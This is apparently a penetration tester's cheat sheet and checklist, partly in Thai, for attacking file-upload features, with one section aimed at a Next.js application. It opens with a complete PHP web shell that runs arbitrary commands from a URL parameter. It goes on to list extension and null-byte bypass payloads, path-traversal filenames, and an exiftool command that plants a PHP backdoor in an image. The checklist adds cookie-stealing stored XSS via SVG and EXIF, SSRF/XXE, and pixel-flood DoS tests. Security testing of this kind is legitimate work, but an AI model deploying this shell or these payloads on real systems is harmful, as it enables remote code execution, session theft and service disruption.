**Simple WebShell**
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Change Content-Type > image/png

``If Find ?Filename= > Path Traversal
```
Filename="..%2fexploit.php"
Filename=".php%00.png"
```

``Bypass
```NullByte
file.php%00.jpg
file.php\x00
file.jpg#.php
file.jpg%20.php
file.php%0d%0a
```
```AlternateExtension
.phtml,.php3,.php5,.phar
.jspx,.jspw
.aspx
```
```EmptyExtension
file.php.\
file.
```
```MagicBytes
GIF89a..
```
```DoubleExtension
.php.jpg
.jpg.php
```

```Polyglot
exiftool -comment='<?=`$_GET[cmd]`?>' image_shell.jpg
```

``Checklist

- [ ] **Client-Side Extension Restriction Bypass:** ลองเปลี่ยนนามสกุลไฟล์ที่หน้าเว็บโดยตรง (เช่น ลองเปลี่ยนรูปธรรมดาเป็น `.html`, `.js`, `.svg`) ดูว่าปุ่ม Upload ยอมให้กดเลือกไฟล์ไหม
    
- [ ] **Content-Type Spoofing:** จับ Request ใน Burp Suite แล้วเปลี่ยนค่า `Content-Type` จาก `text/html` หรือ `application/svg+xml` ให้เป็น `image/png` หรือ `image/jpeg` เพื่อดูว่าระบบตรวจสอบที่ Header ตัวนี้หรือไม่
    
- [ ] **Filename Manipulation (Bypass นามสกุล):** ทดสอบแก้ไขพารามิเตอร์ `filename` ใน Request เป็นรูปแบบต่างๆ:
    
    - นามสกุลเบิ้ล (Double Extension): `exploit.png.html` หรือ `exploit.png.js`
        
    - ตัวพิมพ์เล็ก-ใหญ่ผสม: `exploit.PnG` หรือ `exploit.SvG`
        

---

### 2. Server-Side

- [ ] **SVG SSRF / XXE Validation:** อัปโหลดไฟล์ที่มีโครงสร้าง XML/SVG (ตาม Payload ที่ให้ไว้ก่อนหน้า) เพื่อตรวจสอบว่าเซิร์ฟเวอร์ Next.js มีการรันคำสั่งวิ่งออกไปหา Burp Collaborator หรือพยายามประมวลผล Entity หรือไม่
    
- [ ] **Image Magic Bytes Check:** ลองอัปโหลดไฟล์สคริปต์แต่ใส่ส่วนหัวของไฟล์รูปภาพจริง (เช่น ใส่คำว่า `89 50 4E 47` หรืออักษร `‰PNG` ไว้ที่บรรทัดแรกสุดของไฟล์สคริปต์) เพื่อเช็คว่าเซิร์ฟเวอร์ตรวจเช็คโครงสร้างไฟล์จริง (Magic Bytes) หรือเช็คแค่นามสกุล
    
- [ ] **Pixel Flood DoS (Denial of Service):** ทดสอบอัปโหลดรูปภาพที่มีขนาดพิกเซลหลอกลวงสูงมากๆ เพื่อดูว่าตัวประมวลผลภาพหลังบ้านของ Next.js (`/_next/image`) เกิดอาการค้าง ทรุด หรือติด Timeout เกินกว่าปกติหรือไม่
    

---

### 3. Stored XSS

- [ ] **Stored XSS via SVG:** อัปโหลดไฟล์ SVG ที่ฝัง JavaScript ขโมย Cookie เมื่อเซิร์ฟเวอร์คืนค่า Path จริงกลับมา ให้ลองเอาลิงก์จริงนั้นไปเปิดในเบราว์เซอร์อื่น (หรือ Session อื่น) ดูว่าคำสั่ง `alert` หรือทราฟฟิกวิ่งไปหา Collaborator ทำงานสำเร็จไหม
    
- [ ] **Stored XSS via EXIF Metadata:** ใช้เครื่องมือ `exiftool` ฝังโค้ด JavaScript ลงไปใน Metadata ของไฟล์ภาพปกติ (`.png`/`.jpg`) ในช่องเช่น Artist หรือ Comment แล้วอัปโหลดขึ้นไป จากนั้นไปเปิดดูหน้าจอที่ระบบดึงรูปนี้ไปใช้งาน เพื่อเช็คว่ามันถอดค่า Metadata ไปแสดงผลบนหน้าเว็บจนติด XSS หรือไม่
    

---

### 4. Access Control

- [ ] **Direct Access to Uploaded Files:** นำ Path ที่เซิร์ฟเวอร์คืนกลับมา (`profile-photo-driver/20260518/[UUID].png`) ไปลองเปิดดูตรงๆ โดยไม่ใส่ Token หรือใช้ Private Browser เพื่อเช็คว่าไฟล์เหล่านั้นถูกเปิดเผยสู่สาธารณะโดยไม่มีการควบคุมสิทธิ์หรือไม่ (Publicly Accessible)
    
- [ ] **Path Traversal via Filename:** ลองแก้ไขชื่อไฟล์ใน Request ให้มีสัญลักษณ์ย้อนโฟลเดอร์ เช่น `filename="../../../exploit.png"` เพื่อตรวจสอบว่าระบบยอมให้เราเปลี่ยนจุดบันทึกไฟล์ไปวางไว้ที่โฟลเดอร์สำคัญอื่นๆ ของ Node.js (เช่น โฟลเดอร์ `public` หรือ `pages`) หรือไม่

